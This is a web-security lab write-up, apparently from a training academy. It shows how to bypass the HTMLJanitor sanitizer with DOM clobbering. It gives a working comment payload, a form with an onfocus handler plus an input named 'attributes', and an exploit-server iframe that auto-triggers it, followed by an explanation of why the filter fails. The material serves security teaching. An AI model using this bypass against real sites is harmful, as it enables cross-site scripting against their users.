Lab: Clobbering DOM attributes to bypass HTML filters

This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter 
and uses DOM clobbering to inject a vector that calls the print() function. 
You may need to use the exploit server in order to make your vector auto-execute in the victim's browser.


Go to one of the blog posts and create a comment containing the following HTML:
<form id=x tabindex=0 onfocus=print()><input id=attributes>



Go to the exploit server and add the following iframe to the body:
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">



The library uses the attributes property to filter HTML attributes. 
However, it is still possible to clobber the attributes property itself, causing the length to be undefined. 
This allows us to inject any attributes we want into the form element. In this case, we use the onfocus attribute to smuggle the print() function.
